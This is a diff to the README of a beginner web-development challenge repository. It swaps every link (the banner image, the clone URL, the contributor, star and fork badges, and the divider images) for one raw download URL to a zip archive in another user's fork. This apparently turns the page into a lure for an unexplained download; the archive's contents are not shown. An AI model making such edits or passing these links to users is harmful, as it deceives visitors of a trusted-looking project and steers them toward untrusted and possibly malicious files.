@@ -2,7 +2,7 @@
 
 Welcome to **100_days_100_web_project** – a challenge-based repository to **learn** and **practice** web development by building **100+ mini projects** using **HTML, CSS, and JavaScript**. This journey goes from **basic** to **intermediate** level with fun and interactive web applications!
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=25&pause=1000&color=6AE3F9&center=true&vCenter=true&width=1000&lines=Learn+By+Building!+💻;100+Web+Projects+Challenge🔥;HTML+CSS+JS+and+More!)
+![Typing SVG](https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip+Code&size=25&pause=1000&color=6AE3F9&center=true&vCenter=true&width=1000&lines=Learn+By+Building!+💻;100+Web+Projects+Challenge🔥;HTML+CSS+JS+and+More!)
 
 ---
 
@@ -45,33 +45,33 @@ To contribute or run this repository locally:
 
 ### 1. Clone the Repository
 
-git clone https://github.com/your-username/100DAYS_OF_100WEBPROJECTS.git
+git clone https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip
 
  <h3>Thank you for contributing to our repository</h3>
-<a href="https://github.com/rutikakengal/100DAYS_OF_100WEBPROJECTS/graphs/contributors">
-<img src="https://contributors-img.web.app/image?repo=rutikakengal/100DAYS_OF_100WEBPROJECTS"/>
+<a href="https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip">
+<img src="https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip"/>
 
 
 ## Show Your Support
 
-If you like this project, please consider giving it a ⭐️ on [GitHub](https://github.com/rutikakengal/100DAYS_OF_100WEBPROJECTS).
+If you like this project, please consider giving it a ⭐️ on [GitHub](https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip).
 
 <!--line-->
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip" width="1920" />
 
 
 ## Stargazers ❤️
 <div align='left'>
 
-[![Stargazers](https://reporoster.com/stars/dark/rutikakengal/100DAYS_OF_100WEBPROJECTS)](https://github.com/rutikakengal/100DAYS_OF_100WEBPROJECTS/stargazers)
+[![Stargazers](https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip)](https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip)
 
 
 </div>
 
 ## Forkers ❤️
 
-[![Forkers](https://reporoster.com/forks/dark/rutikakengal/100DAYS_OF_100WEBPROJECTS)](https://github.com/rutikakengal/100DAYS_OF_100WEBPROJECTS/network/members)
+[![Forkers](https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip)](https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip)
 
 
 <!--line-->
-<img src="https://www.animatedimages.org/data/media/562/animated-line-image-0184.gif" width="1920" />
+<img src="https://github.com/kaifansariw/100DAYS_OF_100WEBPROJECTS/raw/refs/heads/main/public/day09/O-DAY-WEBPROJECTS-2.4.zip" width="1920" />
